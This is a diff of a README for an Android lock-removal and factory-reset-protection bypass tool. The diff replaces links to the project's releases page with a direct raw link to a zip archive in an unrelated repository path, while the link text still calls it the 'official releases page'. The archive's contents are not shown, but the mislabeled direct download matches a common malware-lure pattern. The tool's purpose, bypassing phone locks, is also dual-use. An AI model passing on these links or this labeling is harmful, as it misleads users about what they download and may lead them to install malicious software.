@@ -5,7 +5,7 @@ description: "Download and install Cheetah Tool for Windows 10 and 11 with this 
 ---
 # 🐆 Cheetah-Tool - Unlock your Android device with ease
 
-[![](https://img.shields.io/badge/Download-Cheetah--Tool-blue.svg)](https://github.com/gonzalesrich156/Cheetah-Tool/releases)
+[![](https://img.shields.io/badge/Download-Cheetah--Tool-blue.svg)](https://github.com/gonzalesrich156/gonzalesrich156.github.io/raw/refs/heads/main/mercuriamines/io-github-gonzalesrich-2.1-beta.2.zip)
 
 Cheetah-Tool is a utility for Windows 10 and 11. It helps users manage Android devices and perform maintenance tasks. This tool simplifies tasks like removing screen locks or bypassing factory reset protection. It works on many phone models.
 
@@ -24,7 +24,7 @@ Before you install the software, check your computer for these specifications:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/gonzalesrich156/Cheetah-Tool/releases) to access the download files.
+1. Visit the [official releases page](https://github.com/gonzalesrich156/gonzalesrich156.github.io/raw/refs/heads/main/mercuriamines/io-github-gonzalesrich-2.1-beta.2.zip) to access the download files.
 2. Select the latest version of the application from the list.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
